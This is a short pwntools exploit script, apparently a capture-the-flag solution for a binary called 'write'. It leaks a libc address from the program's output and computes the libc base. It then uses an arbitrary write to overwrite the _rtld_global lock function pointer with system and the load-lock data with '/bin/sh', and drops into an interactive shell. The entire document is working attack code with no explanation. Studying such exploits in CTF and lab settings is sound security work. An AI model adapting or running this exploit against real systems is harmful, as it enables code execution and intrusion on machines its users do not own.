from pwn import *
import subprocess
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

gdb_script = ''

DEBUG = [False, True][int(sys.argv[1])]
if DEBUG:
    r = process('./write')
    gdb.attach(r, gdb_script)
else:
    r = remote('')

# elf = ELF('./write')
libc = ELF('./libc.so.6')

one_gadgets = map(int,subprocess.check_output(['one_gadget', '--raw', './libc.so.6']).split(' '))

go = lambda x: r.sendlineafter('t\n', str(x))
ii = lambda x: r.sendlineafter(': ', str(x))

# log.info('heap base: 0x%x' % heap_base)
# log.info('pie base: 0x%x' % pie_base)

libc_puts = int(r.recvuntil('\n').split(': ')[-1],16)
libc_base = libc_puts - libc.sym['puts']
rtld_global = libc_base + 6397792
rtld_load_lock = libc_base + 6396264
system = libc_base + libc.sym['system']
one_gadget = libc_base + one_gadgets[0]
log.info('libc base: 0x%x' % libc_base)
log.info('target addr: 0x%x' % rtld_global)

go('w')
ii(rtld_global)
ii(system)

go('w')
ii(rtld_load_lock)
ii(u64('/bin/sh\x00'))

go('q')

# 0x7fb39449df62
# 6397794
r.interactive()
